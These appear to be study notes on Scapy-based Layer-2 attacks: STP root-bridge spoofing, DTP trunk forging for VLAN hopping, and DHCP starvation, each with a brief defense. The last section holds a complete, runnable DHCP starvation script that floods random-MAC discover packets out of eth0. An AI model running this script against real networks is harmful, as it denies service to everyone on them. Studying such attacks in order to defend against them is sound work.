Scapy - packet manipulation
1. STP protocol (Spanning Tree Protocol)
Basic concept: sniffing trafic and inject forged packets into a network
We make the switch think that the best route to send packets is through our pc
so practically every pc connected to the switch will send the data to us
instead of the targeted devices (DoS - Denial of Service attack)

STP networks elect the device with the 
lowest priority and MAC address for the root switch
We send back a frame to the network which sets our pc to these values

Defense:
Implement rootguard to stop this happening in an STP network





VLAN hacking with Python3
DTP (Dynamic Trunking Protocol) makes it easy to sniff traffic from other VLANs. 
Disable DTP on user facing ports by making those ports access ports.
Sniff DTP packages and forge them. 
Send them back then to instruct the network to form trunks with my pc
A Cisco switch will send all VLAN traffic automatically through all the trunks
so we will be able to sniff the traffic of other VLANs 


Defense: Disable DTP protocol






DHCP DoS attack
Idea: take all the available IP Addresses from the pool, 
so the DHCP won't be able to assign any more

#!/usr/bin/env python3
#DHCP Starvation:
#Import Scapy
from scapy.all import *
#conf.checkIPaddr needs to be set to False. 
#When conf.checkIpaddr the reponse IP isn't checked
#against sending IP address. Don't need to match.	
conf.checkIPaddr = False

#Create DHCP discover with destination IP = broadadcast
#Source MAC address is a random MAC address
#Source IP address = 0.0.0.0
#Destination IP address = broadcast
#Source port = 68 (DHCP / BOOTP Client)
#Destination port = 67 (DHCP / BOOTP Server)
#DHCP message type is discover
dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                     /IP(src='0.0.0.0',dst='255.255.255.255') \
                     /UDP(sport=68,dport=67) \
                     /BOOTP(op=1,chaddr = RandMAC()) \
                     /DHCP(options=[('message-type','discover'),('end')])

#Send packet out of eth0 and loop the packet
sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
